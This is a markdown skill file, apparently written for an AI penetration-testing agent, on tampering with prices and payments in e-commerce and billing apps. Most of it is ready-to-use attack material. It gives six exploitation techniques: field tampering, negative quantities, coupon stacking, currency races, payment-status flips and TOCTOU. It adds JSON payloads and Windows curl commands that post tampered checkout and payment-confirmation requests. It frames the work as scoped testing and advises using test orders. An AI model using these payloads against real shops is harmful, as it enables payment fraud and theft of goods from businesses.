---
name: price-payment-tampering
description: Price, payment and fee tampering — negative quantities, fractional currency, coupon stacking, currency conversion races, fee bypass, and payment-status tampering. Use when scope is e-commerce, billing, or any app that charges money.
category: business-logic
---

# Price & Payment Tampering

## Detection
- Cart/checkout sends price/quantity/discount/fee fields from the client (hidden inputs, JSON, cookies, local storage).
- Payment gateway webhook/return URL is client-reachable (browser can call `payment_success` directly).
- Integer-vs-decimal handling; negative values; floating-point.

## Exploitation
1. **Direct field tamper**: change `{"price":100}` → `{"price":0.01}` or `{"amount":1}` in the order JSON.
2. **Negative quantity**: `{"quantity":-1}` → total decreases; stack items → negative total = store credit.
3. **Coupon stacking / reuse**: apply coupon twice, apply expired coupon, change `coupon` field to admin code, set `discount=100`.
4. **Fee/currency race**: change currency between auth and charge; exploit rounding (small fractions summed up).
5. **Payment-status flip**: call `POST /payment/confirm?order=ID&status=success` directly or alter webhook `paid=true`.
6. **Same order twice / TOCTOU**: place order at old price, then raise price — order stays at old price; or pay once, get N orders (race confirm).

## Payloads
```
{"items":[{"id":1,"qty":-1,"price":999}],"discount":100}
{"order":{"total":0,"currency":"USD"}}
POST /pay/confirm {"orderId":"X","status":"success","paid":true}
{"coupon":"ADMIN-FREE-100"}
```

## Tool Commands (Windows)
```powershell
# intercept checkout request and alter fields via Burp/curl
curl.exe -s -X POST "$U/api/checkout" -H 'Cookie: sess=...' -d '{"items":[{"id":1,"qty":-1}],"discount":100}'
curl.exe -s -X POST "$U/api/payment/confirm" -d '{"orderId":"ORD1","status":"success"}'
```

## Verification & Evidence
- Proof = order fulfilled / item delivered at a tampered price (or negative total), or payment confirmed without paying.
- Keep evidence minimal + non-destructive: use a test order if possible; never take real inventory.